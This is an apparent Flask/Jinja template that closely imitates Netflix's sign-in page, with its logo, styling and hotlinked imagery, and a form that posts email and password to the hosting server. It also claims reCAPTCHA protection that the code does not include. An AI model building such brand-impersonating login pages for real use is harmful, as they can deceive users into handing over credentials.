<!DOCTYPE html>
<html lang="en">
<head>
    <title>Netflix - Login</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body {
            background-color: #141414;
            color: #fff;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            height: 100vh;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.8)), 
                              url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88b/a3873901-5b7c-46eb-b9fa-12fea5197bd3/IN-en-20240311-popsignuptwoweeks-perspective_alpha_website_large.jpg');
            background-size: cover;
            background-position: center;
        }
        
        .login-container {
            background-color: rgba(0, 0, 0, 0.75);
            padding: 60px 68px;
            border-radius: 4px;
            min-width: 450px;
        }
        
        .netflix-logo {
            width: 167px;
            height: 45px;
            margin-bottom: 30px;
            display: block;
        }
        
        h2 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 28px;
        }
        
        .form-control {
            background: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            height: 50px;
            padding: 16px 20px;
            margin-bottom: 16px;
        }
        
        .form-control:focus {
            background: #454545;
            box-shadow: none;
            color: #fff;
        }
        
        .form-label {
            color: #8c8c8c;
            font-size: 13px;
            margin-bottom: 5px;
        }
        
        .btn-netflix {
            background-color: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            padding: 12px;
            width: 100%;
            margin: 24px 0 12px;
        }
        
        .btn-netflix:hover {
            background-color: #f40612;
            color: white;
        }
        
        .help-text {
            color: #b3b3b3;
            font-size: 13px;
            margin-top: 10px;
        }
        
        .signup-link {
            color: #fff;
            text-decoration: none;
        }
        
        .signup-link:hover {
            text-decoration: underline;
        }
        
        .error-message {
            color: #e87c03;
            font-size: 13px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="netflix-logo">
        <h2>Sign In</h2>
        
        {% with messages = get_flashed_messages() %}
            {% if messages %}
                <div class="error-message">
                    {{ messages[0] }}
                </div>
            {% endif %}
        {% endwith %}
        
        <form method="post">
            <div class="mb-3">
                <label for="username" class="form-label">Email or phone number</label>
                <input type="text" name="username" id="username" class="form-control" required>
            </div>
            <div class="mb-3">
                <label for="password" class="form-label">Password</label>
                <input type="password" name="password" id="password" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-netflix">Sign In</button>
            
            <div class="d-flex justify-content-between align-items-center">
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="rememberMe">
                    <label class="form-check-label help-text" for="rememberMe">
                        Remember me
                    </label>
                </div>
                <a href="#" class="help-text">Need help?</a>
            </div>
            
            <div class="help-text mt-4">
                New to Netflix? <a href="{{ url_for('register') }}" class="signup-link">Sign up now</a>.
            </div>
            
            <div class="help-text mt-2">
                This page is protected by Google reCAPTCHA to ensure you're not a bot.
            </div>
        </form>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
